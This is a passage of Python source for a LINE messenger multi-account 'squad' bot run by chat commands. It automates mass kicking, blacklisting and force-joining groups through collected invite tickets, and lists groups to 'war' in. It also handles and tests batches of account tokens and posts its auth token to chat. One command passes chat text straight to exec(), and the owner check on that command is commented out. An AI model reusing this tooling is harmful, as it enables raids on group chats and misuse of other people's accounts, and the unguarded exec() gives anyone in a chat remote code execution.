        				else:self.client.sendMessage(to,"Dalah maless.. (￣へ￣)");self.client.deleteSelfFromChat(to)
        			if command == "out": 
        				if self.Msg(op):
        					if self.set["lastmsg"] == "":self.client.sendMessage(to,self.promo)
        					else:self.client.sendMessage(to,self.set["lastmsg"])
        					self.client.sendContact(to,sender)
        					self.client.deleteSelfFromChat(to)
        			if command == "cbots":
        				if self.set["squad"] != {}:
        					for b in self.set["squad"]:
        						self.lesting.user[b]["squad"] = False
        					self.set["squad"].clear()
        					self.client.sendMessage(to,"clear all bots success...")
        				else:
        					self.client.sendMessage(to,"Data empty")
        			if command == "bots":
        				if self.Squad != {}:
        					tx = []
        					for a in self.Squad:
        						tx.append(a)
        					self.client.sendMentionWithList(to, "SQUAD BOTS",tx)
        				else:self.client.sendMessage(to,"Not have friend")
        			if command == "ws":
        				if self.Msg(op):
        					ws = [user for user in self.set["ws"]]
        					if ws != []:self.client.sendMentionWithList(to, "WHItE LIST",ws)
        					else:self.client.sendMessage(to,"Not have whitList..")

        			if command.startswith("fbtamp"):
        				if self.Msg(op):
        					split = text.split(" ")
        					self.sock.sendall(str({"func":"btamps","group":to,"bot":self.mid,"set":split[1]}).encode("utf-8"))

        			if command.startswith("protect"):
        				if self.Msg(op):
        					split = text.split(" ")
        					if "max" == split[1]:
        						data = ["qr","invite","kick","cancel","antiTag","lockname"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        					if "kick" == split[1]:
        						data = ["kick"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        					if "cancel" == split[1]:
        						data = ["cancel"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        					if "qr" == split[1]:
        						data = ["qr","lockname"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        					if "invite" == split[1]:
        						data = ["invite"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        					if "tag" == split[1]:
        						data = ["antiTag"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        					if "null" == split[1]:
        						data = ["null"]
        						self.sock.sendall(str({"func":"protect","group":to,"bot":self.mid,"data":data}).encode("utf-8"))
        			if command == "resetdata":
        				if self.Msg(op):
        					self.sock.sendall(str({"func":"resetdata","group":to,"bot":self.mid,"sender":sender}).encode("utf-8"))
        			if command == "restart":
        				if self.Msg(op):
        					self.restarting(self.mid,to)

        			if command == "join":
        				if self.Msg(op):
        					self.joinQr(to)
        					
        			if command == "help":
        				if self.Msg(op):
        					self.client.sendMessage(to,self.helpMessage(msg._from))
        					self.client.reqSeq

        			if command == "server":
        				from requests import get
        				def getIp():
        					ip = get('https://api.ipify.org').text
        					if 20 >= len(str(ip)):
        						return ip
        					return getIp()
        				ips = getIp()
        				start = time.time()
        				tx = "╭ ◤ INFO SERVER ◥\n"
        				if self.Msg(op):
        					f = str(time.time() - start)
        					tx += "│• headers : {}\n".format(self.client.config.APPLICATION)
        					tx += "│• user agent : {}\n".format(self.client.config.USER_AGENT)
        					tx += "│• host line : {}\n".format(self.client.config.LINE_HOST)
        					tx += "│• revision : {}\n".format(self.client.keeper.localRev)
        					tx += "│• ip client : {}\n".format(ips)
        					tx += "│• server TCP : {}\n".format(self.ser["server"])
        					tx += "│• speed : {}\n".format(f[:6])
        					tx += "╰ ◣{} ◢ ".format(self.logo)
        					self.client.sendMessage(to,tx)
        				else:
        					f = str(time.time() - start)
        					tx += "│• headers : {}\n".format(self.client.config.APPLICATION)
        					tx += "│• user agent : {}\n".format(self.client.config.USER_AGENT)
        					tx += "│• host line : {}\n".format(self.client.config.LINE_HOST)
        					tx += "│• revision : {}\n".format(self.client.keeper.localRev)
        					tx += "│• ip client : {}\n".format(ips)
        					tx += "│• server TCP : {}\n".format(self.ser["server"])
        					tx += "│• speed : {}\n".format(f[:6])
        					tx += "╰ ◣{} ◢".format(self.logo)
        					self.client.sendMessage(to,tx)

        			if command == "here":
        				if self.Msg(op):
        					users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
        					bots = {mid for mid, user in users.items() if user["squad"]}
        					self.client.sendMessage(to,"{}/{} in here\nNumber of bots {}".format(len(self.stayBot(to)),len(bots),len(self.force)))
        
        			if command.startswith("https:"):
        				split = text.split("//")
        				ticket = str(split[1])
        				gc = self.client.findChatByTicket(ticket[15:]).chatMid
        				self.client.acceptChatInvitationByTicket(gc,ticket[15:])

        			if command.startswith("upprefix"):
        				split = text.split(" ")
        				old = self.lesting.storage.command["prefix"]
        				self.client.sendMessage(to, "Prefix [ {} ] update [ {} ]".format(old,split[1]))
        				self.set["steal"]["prefix"] = str(split[1])

        			if command.startswith("upsymbol"):
        				split = text.split(": ")
        				old = self.set["steal"]["logo"]
        				self.client.sendMessage(to, "Logo [ {} ] set up to [ {} ]".format(old,split[1]))
        				self.set["steal"]["logo"] = str(split[1])

        			if command.startswith("limit"):
        				split = text.split(" ")
        				if "off" == str(split[1]):
        					if self.client.limit == True or self.mid not in self.set["squad"]:
        						self.client.deleteSelfFromChat(to)

        			if command.startswith("say"):
        				split = text.split("> ")
        				self.client.sendMessage(to,split[1])



        			if command.startswith("upname"):
        				users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
        				bots = [mid for mid, user in users.items() if user["squad"]]
        				split = text.split(": ")
        				b = self.client.getProfile()
        				self.client.sendMessage(to,"Name ({}) change to ({})".format(b.displayName,split[1]))
        				b.displayName = "{}".format(split[1])
        				self.client.updateProfile(b)

        			if command.startswith("stay"):
        				split = text.split(" ")
        				k = int(split[1])
        				if self.Msg(op):
        					if k <= len(self.force):
        						#k -=1
        						count = k
        						self.forceJoin(to,count)
        					else:self.client.sendMessage(to, "bot already only {}".format(len(self.force)))

        			if command == "sentil":
        					if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Message not found.')
        					M = self.client.getRecentMessagesV2(to, 1001)
        					anu = []
        					for ind, i in enumerate(M):
        						if i.id == msg.relatedMessageId:
        							anu.append(i)
        					time.sleep(1)
        					if to in self.G_ticket:self.Link = self.G_ticket[to]
        					self.blacklist[anu[0]._from] = True
        					if self.Msg(op):
        						try:
        							self.client.deleteOtherFromChat(to, {anu[0]._from});self.blacklist[anu[0]._from] = True;self.war[to] = True
        						except:
        							self.client.sendMessage(to, "Error 404")

        			if command.startswith("set"):
        				split = text.split(" ")
        				res = text.split(":")
        				#if self.Msg(op):
        				if "skick" == str(split[1]):
        						if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Sticker not found.')
        						M = self.client.getRecentMessagesV2(to, 1001)
        						anu = []
        						for ind, i in enumerate(M):
        							if i.id == msg.relatedMessageId:
        								anu.append(i)
        								try:
        									self.set["skick"]["STKID"] = int(anu[0].contentMetadata["STKID"])
        									time.sleep(0.1)
        									self.set["skick"]["STKPKGID"] = anu[0].contentMetadata["STKPKGID"]
        									time.sleep(0.1)
        									self.set["skick"]["STKVER"] = anu[0].contentMetadata["STKVER"]
        								except Exception as e:
        									print(e)
        						self.client.sendMessage(to, "Sticker for kick Update succes...")
        						return
        				if "scb" == str(split[1]):
        						if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Sticker not found.')
        						M = self.client.getRecentMessagesV2(to, 1001)
        						anu = []
        						for ind, i in enumerate(M):
        							if i.id == msg.relatedMessageId:
        								anu.append(i)
        								try:
        									self.set["scb"]["STKID"] = int(anu[0].contentMetadata["STKID"])
        									time.sleep(0.1)
        									self.set["scb"]["STKPKGID"] = anu[0].contentMetadata["STKPKGID"]
        									time.sleep(0.1)
        									self.set["scb"]["STKVER"] = anu[0].contentMetadata["STKVER"]
        								except Exception as e:
        									print(e)
        						self.client.sendMessage(to, "Sticker for clearban Update succes...")
        						self.saved()
        						return
        				if "sbyall" == str(split[1]):
        						if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Sticker not found.')
        						M = self.client.getRecentMessagesV2(to, 1001)
        						anu = []
        						for ind, i in enumerate(M):
        							if i.id == msg.relatedMessageId:
        								anu.append(i)
        								try:
        									self.set["sbyall"]["STKID"] = int(anu[0].contentMetadata["STKID"])
        									time.sleep(0.1)
        									self.set["sbyall"]["STKPKGID"] = anu[0].contentMetadata["STKPKGID"]
        									time.sleep(0.1)
        									self.set["sbyall"]["STKVER"] = anu[0].contentMetadata["STKVER"]
        								except Exception as e:
        									print(e)
        						self.client.sendMessage(to, "Sticker for byeall Update succes...")
        						self.saved()
        						return
        				if "sinvite" == str(split[1]):
        						if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Sticker not found.')
        						M = self.client.getRecentMessagesV2(to, 1001)
        						anu = []
        						for ind, i in enumerate(M):
        							if i.id == msg.relatedMessageId:
        								anu.append(i)
        								try:
        									self.set["invite"]["STKID"] = int(anu[0].contentMetadata["STKID"])
        									time.sleep(0.1)
        									self.set["invite"]["STKPKGID"] = anu[0].contentMetadata["STKPKGID"]
        									time.sleep(0.1)
        									self.set["invite"]["STKVER"] = anu[0].contentMetadata["STKVER"]
        								except Exception as e:
        									self.client.sendMessage(to,str(e))
        						self.client.sendMessage(to, "Sticker for Invite Update succes...")
        						self.saved()
        						return
        				if "scomd" == str(split[1]):
        						if msg.relatedMessageId == None:return self.client.sendMessage(to, 'Reply Sticker not found.')
        						M = self.client.getRecentMessagesV2(to, 1001)
        						anu = []
        						for ind, i in enumerate(M):
        							if i.id == msg.relatedMessageId:
        								anu.append(i)
        								try:
        									self.set["scomd"][anu[0].contentMetadata["STKID"]] = str(res[1])
        								except Exception as e:
        									print(e)
        									self.set["scomd"] = {anu[0].contentMetadata["STKID"]:str(res[1])}
        						self.client.sendMessage(to, "Sticker for commands {} \nadding succes...".format(res[1]))
        						self.saved()
        						return
        				if "lmsg" == str(split[1]):
        					self.set["lastmsg"] = str(res[1])
        					self.client.sendMessage(to, "Last message: {} \nUpdate succes...".format(res[1]))
        					self.saved()
        					return
        				if "resadd" == str(split[1]):
        					self.set["resadd"] = str(res[1])
        					self.client.sendMessage(to, "Respon add: {} \nUpdate succes...".format(res[1]))
        					self.saved()
        					return 

        			if command.startswith("putsquad"):
        				if self.Msg(op):
        					split = text.split(" ")
        					token = split[1]
        					with open("token/{}.txt".format(str(self.file)), "r") as f:
        						tlist = f.readlines()
        						squad = [x.strip() for x in tlist]
        					new = []
        					for c in token.split("\n"):
        						if c not in squad:
        							try:
        								self.client.sendContact(to,str(c)[:33])
        								new.append(c)
        								time.sleep(0.1)
        							except:self.client.sendMessage(to,"BAd token\n\n{}".format(c))
        						else:self.client.sendMessage(to,"This token already in squad {}\n\n{}".format(self.file,c))
        					if len(new) >= len(self.force):
        						if len(new) == len(self.force):
        							self.sock.sendall(str({"func":"addtoken","new":new,"bot":self.mid,"group":to}).encode("utf-8"))
        							self.client.sendMessage(to,"new squad for number {} on process".format(len(squad)))
        						else:
        							sisa = "TOKEN LEBIH\n"
        							put = []
        							h = 0
        							for s in new:
        								if h != len(self.force):
        									put.append(s)
        									h += 1
        								else:
        									sisa += "{}\n".format(s)
        							self.sock.sendall(str({"func":"addtoken","new":put,"bot":self.mid,"group":to}).encode("utf-8"))
        							self.client.sendMessage(to,"new squad for number {} on process\n\n{}".format(len(squad),sisa))
        					else:
        						self.client.sendMessage(to,"jumblah tokene kurang {} cok".format(len(self.force) - len(new)))
        								

        			if command.startswith("rmvt") and msg._from in self.makers:
        				split = text.split(" ")
        				file = split[1]
        				token = split[2]
        				try:
        					with open("token/{}.txt".format(str(file)), "r") as f:
        						tlist = f.readlines()
        						squad = [x.strip() for x in tlist]
        				except:
        					self.client.sendMessage(to,"file {} not found".format(split[1]))
        				delet = []
        				for t in range(len(squad)):
        					if t == int(token):
        						delet.append(squad[t])
        				for e in range(len(squad)):
        					if squad[e][:33] == self.mid:
        						m = open('token/{}.txt'.format(file), "w")
        						m.write("")
        						m.close()
        						for g in range(len(squad)):
        							with open('token/{}.txt'.format(file), 'a') as c:
        								if g == 0:
        									if squad[g] not in delet:c.write("{}".format(squad[g]))
        								else:
        									if squad[g] not in delet:c.write("\n{}".format(squad[g]))
        						self.client.sendMessage(to,"succes Remove\n{}".format(str(delet)))

        			if command.startswith("mode"):
        				split = text.split(" ")
        				mode = str(split[1])
        				if self.Msg(op):self.sock.sendall(str({"func":"mode","mode":mode,"group":to,"usbot":str(self.mid)}).encode("utf-8"))


        			if command.startswith("crun"):
        				split = text.split(" ")
        				squad = int(split[1])
        				if self.Msg(op):self.sock.sendall(str({"func":"crun","squad":squad,"group":to,"usbot":str(self.mid)}).encode("utf-8"))
        				
        			if command.startswith("use"):
        				split = text.split(" ")
        				if "js" == split[1]:
        					if self.purge:
        						self.client.sendMessage(to,"Kick by java system already actived")
        					else:
        						self.set["purge"] = True
        						self.purge = True
        						self.client.sendMessage(to,"Kick by java system actived")
        				if "thread" == split[1]:
        					if self.purge:
        						self.set["purge"] = False
        						self.purge = False
        						self.client.sendMessage(to,"Kick by thread system actived")
        					else:
        						self.client.sendMessage(to,"Kick by thread system already actived")
        				self.saved()

        			if command == "link":
        				if self.Msg(op):
        					D = self.client.getChat(to)
        					if D.extra.groupExtra.preventedJoinByTicket == True:
        						D.extra.groupExtra.preventedJoinByTicket = False
        					self.client.updateChat(D,4)
        					ticket = self.client.reissueChatTicket(to)
        					self.client.sendMessage(to,"https://line.me/R/ti/g/{}".format(ticket))

        			if command == "getme":
        				if self.Msg(op):
        					name = self.client.getContact(sender).displayName
        					self.client.sendMessage(to, "Name: {}\nMid: {}".format(name,sender))
        					self.client.sendContact(to, sender)

        			if command == "rcount":
        				self.client.count["kick"] = 0
        				self.client.count["cancel"] = 0
        				self.client.count["invite"] = 0
        				self.client.count["msg"] = 0
        				self.starting = 0
        				self.saved()
        				self.client.sendMessage(to, "reset count sukses....")

        			if command == "fix":
        				users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
        				invites = {mid for mid, user in users.items() if user["squad"] and mid not in self.mid}
        				for a in invites:
        					try:self.client.findAndAddContactsByMid(a);time.sleep(2)
        					except:self.client.sendMessage(to, "Limit add");return
        				self.client.sendMessage(to, "add all contact bots")
        			if command == "leftallgroup":
        				group = self.client.getAllChatMids(True).memberChatMids
        				for gc in group:
        					if gc not in to and gc not in self.protect:self.client.deleteSelfFromChat(gc)
        				self.client.sendMessage(to, "succes leave from {} group".format(len(group)))

        			if command == "update":
        				self.update(to)

        			if command.startswith("upgrade"):
        				if msg._from in self.makers:
        					split = text.split(" ")
        					namefile = split[1]
        					folder = split[2]
        					self.upgradeSc["group"] = str(to)
        					self.upgradeFile(str(namefile),str(folder))
        				else:self.client.sendMessage(to,"You not makers")

        			if command == "mytoken":
        				if msg._from in self.makers:self.client.sendMessage(to,str(self.client.authToken))

        			if command == "uppict":
        				self.upfoto = True
        				if self.Msg(op):
        					self.client.sendMessage(to,"please send picture..")
        
        			if command == "sname":
        				if self.Msg(op):
        					self.sock.sendall(str({"func":"resp","group":to}).encode("utf-8"))

        			if command == "rchat":
        				self.client.removeAllMessages(op.param2)
        				self.client.sendMessage(to,"All msg removd  🚮")


        			if command == "tagall" and self.Msg(op):
        				chat = self.client.getChat(to).extra.groupExtra.memberMids
        				self.client.sendMentionWithList(to,"MEMBERS GROUPS",chat )

        			if command.startswith("exec"):
        				#if msg._from in self.makers:
        					split = text.split(">\n")
        					try:print(exec(split[1]))
        					except Exception as e:self.client.sendMessage(to,str(e))

        			if command == "logqr":
        				if self.Msg(op):
        					hed = "lite"
        					def loginLite(to,hed):
        						g = loginWithQrCode(hed)
        						Token.append(str({g.certificate:g.accessToken}))
        						
        					def loginLiteCert(to,hed, cert):
        						g = loginWithQrCode(hed,cert)
        						Token.append(str({g.certificate:g.accessToken}))
        						
        					auth = ""
        					cert = ""
        					if sender not in self.set["token_user"]:
        						threading.Thread(target=loginLite, args=(to,hed, )).start()
        						link = True
        						code= True
        						while True:
        							if Token:
        								if 1 == len(Token):
        									if link:
        										self.client.sendMessage(to,"{}".format(Token[1 - 1]))
        										link = False
        									continue
        								if 2 == len(Token):
        									if code:
        										self.client.sendMessage(to,"{}".format(Token[2 - 1]))
        										code = False
        									continue
        								if 3 == len(Token):
        									res = ast.literal_eval(Token[3 - 1])
        									print(res)
        									for d in res:
        										auth = res[d]
        										cert = d
        									break
        							time.sleep(1)
        					else:
        						threading.Thread(target=loginLiteCert, args=(to,hed, self.set["token_user"][sender],)).start()
        						link = True
        						code= True
        						while True:
        							if Token:
        								if 1 == len(Token):
        									if link:
        										self.client.sendMessage(to,"{}".format(Token[1 - 1]))
        										link = False
        									continue
        								if 2 == len(Token):
        									res = ast.literal_eval(str(Token[2 - 1]))
        									for d in res:
        										auth = res[d]
        										cert = d
        									break
        							time.sleep(1)
        					from line import LINE 
        					cl = LINE(LINE.Keeper(auth))
        					self.set["token_user"][cl.Mid]= str(cert)
        					group = cl.getAllChatMids(True).memberChatMids
        					g_ticket = {}
        					for gc in group:
        						try:ticket = cl.reissueChatTicket(gc)
        						except:pass
        						g_ticket[gc] = ticket
        					sc = """{}exec>
up = len(self.set['G_ticket'])
qr = {}
plus = 0
r = len(self.set['G_ticket'])
for t in qr:
	if t not in self.set['G_ticket']:
		plus += 1
	self.set['G_ticket'][t] = qr[t]
	self.G_ticket[t] = qr[t]
self.set["token_user"]["{}"]= "{}"
self.saved()
self.client.sendMessage(to,'success update '+str(r)+' group ticket and '+str(plus)+' new group ticket..')
""".format(self.lesting.storage.command["prefix"],g_ticket,cl.Mid,cert)
        					p = {cl.Mid:cert}
        					time.sleep(1)
        					cl.sendMessage(to,sc)
        					time.sleep(1)
        					self.sock.sendall(str({"func":"scert","cert":p}).encode("utf-8"))
        					
        			if command == "f*ck":
        				if self.Msg(op):
        					self.GasKeun(to)

        			if command.startswith("gas"):
        				if self.Msg(op):
        					split = text.split(" ")
        					group = []
        					try:
        						for xx in self.client.getAllChatMids(True).memberChatMids:group.append(xx)
        						gc = group[int(split[1]) - 1]
        						tx = self.GasKeun(gc)
        						self.client.sendMessage(to, tx)
        					except:self.client.sendMessage(to, "group not found")

        			if command.startswith("access") and self.Msg(op):
        				split = text.split(">")
        				if "list" == split[1]:
        					tx = "╭◤ ACCESS GROUP ◥\n"
        					num = 0
        					max = 0
        					for t in self.G_ticket:
        						if max < 100:
        							gc = self.client.getChat(t)  #
        							gname = gc.chatName
        							mem = gc.extra.groupExtra.memberMids
        							pen = gc.extra.groupExtra.inviteeMids
        							num += 1
        							tx += "│{}. {} {}/{}\n".format(num,gname,len(mem),len(pen))
        							max +=1
        						else:
        							gc = self.client.getChat(t)  #
        							gname = gc.chatName
        							mem = gc.extra.groupExtra.memberMids
        							pen = gc.extra.groupExtra.inviteeMids
        							num += 1
        							tx += "│{}. {} {}/{}\n".format(num,gname,len(mem),len(pen))
        							max = 0
        							self.client.sendMessage(to,tx)
        							tx = ""
        					tx += "├──────────────\n"
        					tx += "│u can wars in {} groups\n│but u need check access first\n│Example: {}access>(numberGroup)\n".format(num,self.lesting.storage.command["prefix"])
        					tx +="╰ ◣{} ◢".format(self.logo)
        					self.client.sendMessage(to,tx)
        				else:
        					num = 0
        					listTicket = [self.G_ticket[t] for t in self.G_ticket]
        					listGc = [t for t in self.G_ticket]
        					gc = listGc[int(split[1]) - 1]
        					ticket = listTicket[int(split[1]) - 1]
        					try:
        						gname = self.client.findChatByTicket(ticket).chatName
        						self.client.sendMessage(to,"Name group: {} \nStatus access: fresh ✅".format(gname))
        					except Exception as e:
        						if 'code=5' in str(e):
        							self.client.sendMessage(to,"Please update access for group {}".format(self.client.getChat(gc).chatName))
        							del self.set["G_ticket"][gc]
        						elif 'code=35' in str(e):
        							self.client.sendMessage(to, "you bot limit join ticket please use mode ultra or low")
        			if command == "infoset":
        				if self.Msg(op):
        					tx = ""
        					if to in self.protect:
        						for o in self.protect[to]:
        							if self.protect[to][o]:
        								tx += "• {} ✅\n".format(o)
        							else:
        								tx += "• {} ⭕\n".format(o)
        					else:
        						tx += "• ALL PROTECT DISABLED ☑️"
        					if self.Fast and self.beckupQr:
        						tx += "\n• mode : GOD\n"
        					if self.Fast == False and self.beckupQr:
        						tx += "\n• mode : SMOTH\n"
        					if self.Fast and self.beckupQr == False:
        						tx += "\n• mode : ULTRA\n"
        					if self.Fast == False and self.beckupQr == False:
        						tx += "\n• mode : LOW\n"
        					if self.purge:
        						tx += "\n• Kick by : JS\n"
        					else:
        						tx += "\n• Kick by : Thread\n"
        					if to in self.war:
        						tx += "• standby : ⚔️\n"
        					else:
        						tx += "• standby : 🛡\n"
        					if self.btamps:
        						tx += "• blacktemp : 🔍"
        					else:
        						tx += "• blacktemp : ⚫"
        					self.client.sendMessage(to,tx)
        					
        					
        			if command == "invite":
        				if self.Msg(op):
        					chat = self.client.getChat(to)
        					users = {mid: self.lesting.user[mid] for mid in self.lesting.user}
        					bots = {mid for mid, user in users.items() if user["squad"]}
        					kntl = {mid for mid in bots if mid not in chat.extra.groupExtra.memberMids}
        					if kntl:
        						for a in bots:
        							if a in chat.extra.groupExtra.inviteeMids:threading.Thread(target=self.client.cancelChatInvitation, args=(to, a, )).start();time.sleep(1)
        						time.sleep(0.2)
        						self.client.inviteIntoChat(to, kntl)
        					else:
        						self.client.sendMessage(to, "already")
        			if command.startswith("tokcek"):
        				if self.Msg(op):
        					split = text.split(" ")
        					token = split[1]
        					D = self.client.getChat(to)
        					qr = D.extra.groupExtra.preventedJoinByTicket
        					if qr == True:
        						D.extra.groupExtra.preventedJoinByTicket = False
        						self.client.updateChat(D,4)
        					ticket = self.G_ticket[to]
        					from line import LINE 
        					tx = ""
        					for c in token.split("\n"):
        						cl = LINE(LINE.Keeper(c))
        						try:
        							cl.acceptChatInvitationByTicket(to,ticket)
        							time.sleep(1)
        							tx += "{}\n".format(c)
        						except:
        							pass
        					self.client.sendMessage(to,tx)

        			if command.startswith("unsend"):
         				split = text.split(" ")
         				self.unsend(to,msg,split[1])

        			if command == "reboot":
        				self.client.sendMessage(to,"Rebooting system...")
        				self.Restart()

        			if command == "getsquad":
        				if self.Msg(op):
        					get = self.client.getChat(to)
        					mem = get.extra.groupExtra.memberMids
        					list = []
        					for user in mem:
        						if user not in list and self.notAllow(user):
        							squad = self.detectSquad(op,user)
        							self.client.sendMentionWithList(to,"MEMBERS SQUAD",squad )
        							list += squad

        except Exception as e: #ValueError Exception
        	self.loger.append(str(e))
        	if 'code=20' in str(e) :
        		print('\033[91m'+"YOU TOKEN FREZE\nPLEASE WAIT 1 HOURS"+'\033[0m')
        		time.sleep(3600)
        		self.Restart()
        	elif 'code=10' in str(e):
        		return
        	elif 'code=35' in str(e):
        		self.client.limit = True
        		self.duedate = self.duedate + relativedelta(days=1)
        		self.set["count"]["duedate"][self.mid] = str(self.duedate)
        		print("limit")
        	elif str(e) in ['[Errno 104] Connection reset by peer','[Errno 32] Broken pipe','[Errno 111] Connection refused','list index out of range']:
        		if self.war == {}:
        			self.Restart()
        	print("op eror : "+str(e))
        	pass
        self.saved()

    

    def unsend(self,to,msg,count):
    					 def getMentiones(msg):
         					if 'MENTION' in msg.contentMetadata.keys()!= None:
         						mention = ast.literal_eval(msg.contentMetadata['MENTION'])
         						mentionees = mention['MENTIONEES']
         						return [mention["M"] for mention in mentionees]
         					else:
         						return None
    					 pucek = getMentiones(msg)
    					 num = 0
    					 succes = False
    					 if pucek == None:
         					mes = int(count)
         					M = self.client.getRecentMessagesV2(to, 101)
         					MId = []
         					for ind,i in enumerate(M):
         						if ind == 0:
         							pass
         						else:
         							if i._from == self.mid:
         								MId.append(i.id)
         								if len(MId) == mes:
         									break
         					def unsMes(id):
         						self.client.unsendMessage(id)
         					for i in MId:
         						unsMes(i)
         					succes = True
    					 else:
         					for puk in pucek:
         						if puk in self.mid:
         							mes = int(count)
         							M = self.client.getRecentMessagesV2(to, 101)
         							MId = []
         							for ind,i in enumerate(M):
         								if ind == 0:
         									pass
         								else:
         									if i._from == self.mid:
         										MId.append(i.id)
         										if len(MId) == mes:
         											break
         							def unsMes(id):
         								self.client.unsendMessage(id)
         							for i in MId:
         								unsMes(i)
         							succes = True
         					num +=1
    					 if succes == False:
         					self.client.sendMessage(to,"Target not in Bots")
						

    def setSquad(self,op):
    	get = self.client.getChat(op.param1)
    	mem = get.extra.groupExtra.memberMids
    	list = []
    	for user in mem:
    		if self.notAllow(user) and user not in list:
    			squad = self.detectSquad(op,user)
    			list += squad
    			if 4 <= len(squad):
    				self.getbtamp(squad)
    			
 
    def detectSquad(self,op,user):
    	if op.type != 26:
    		get = self.client.getChat(op.param1)
    		mem = get.extra.groupExtra.memberMids
    		squad = []
    		timeJoin = ""
    		if user in mem:
    			timeJoin = str(mem[user])[:9]
    		for timing in mem:
    			if self.notAllow(timing):
    				if str(mem[timing])[:9] in timeJoin:
    					squad.append(timing)
    		return squad
    	else:
    		get = self.client.getChat(op.message.to)
    		mem = get.extra.groupExtra.memberMids
    		squad = []
    		timeJoin = ""
    		if user in mem:
    			timeJoin = str(mem[user])[:9]
    		for timing in mem:
    			if str(mem[timing])[:9] in timeJoin:
    				squad.append(timing)
    		return squad

    def lastSquad(self,user):
    		mem = self.lastSquadTime
    		squad = []
    		timeJoin = ""
    		if user in mem:
    			timeJoin = str(mem[user])[:9]
    		for timing in mem:
    			if self.notAllow(timing):
    				if str(mem[timing])[:9] in timeJoin:
    					squad.append(timing)
    		return squad
    def remoteText(self,grup):
    	if self.remotGroup == "":
    		return
    	else:
    		self.client.sendMessage(grup,"command has been done in the group {}".format(self.client.getChat(self.remotGroup).chatName))
    		self.remotGroup = ""
    
    def sendStickerByOp(self,msg,to):
    	if msg.relatedMessageId == None:
    		return self.client.sendMessage(to, "please Replay sticker") 
    	M = self.client.getRecentMessagesV2(to, 1001)
    	anu = []
    	for ind, i in enumerate(M):
    		if i.id == msg.relatedMessageId:
    			anu.append(i)
    	stk = str()
    	stkp = str()
    	stki = str()
    	sc = "{}set scomd :exec>\n".format(self.lesting.storage.command["prefix"]) 
    	sc += "contentMetadata = {}\n"
    	sc += "contentMetadata['STKID'] = '{}'\n".format(anu[0].contentMetadata["STKID"])
    	sc += "contentMetadata['STKPKGID' ] = '{}'\n".format(anu[0].contentMetadata["STKPKGID"])
    	sc += "contentMetadata['STKVER'] = '{}'\n".format(anu[0].contentMetadata["STKVER"])
    	sc += "self.client.sendMessage(to, '', contentMetadata, 7)"
    	return sc



